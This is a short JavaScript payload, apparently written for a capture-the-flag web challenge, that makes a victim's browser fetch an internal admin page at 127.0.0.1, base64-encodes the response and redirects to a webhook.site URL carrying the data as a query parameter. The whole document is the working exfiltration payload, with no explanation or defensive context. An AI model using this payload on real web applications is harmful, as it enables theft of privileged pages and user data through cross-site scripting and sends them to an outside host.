fetch('http://127.0.0.1/admin')
  .then(r => r.text())
  .then(flag => {
    console.log('Flag fetched successfully!');
    window.location.href = "https://webhook.site/8e39f0bd-7c45-4944-8fbd-6557b1679874/?flag="+btoa(flag);
  })
  .catch(error => console.error('Error:', error));
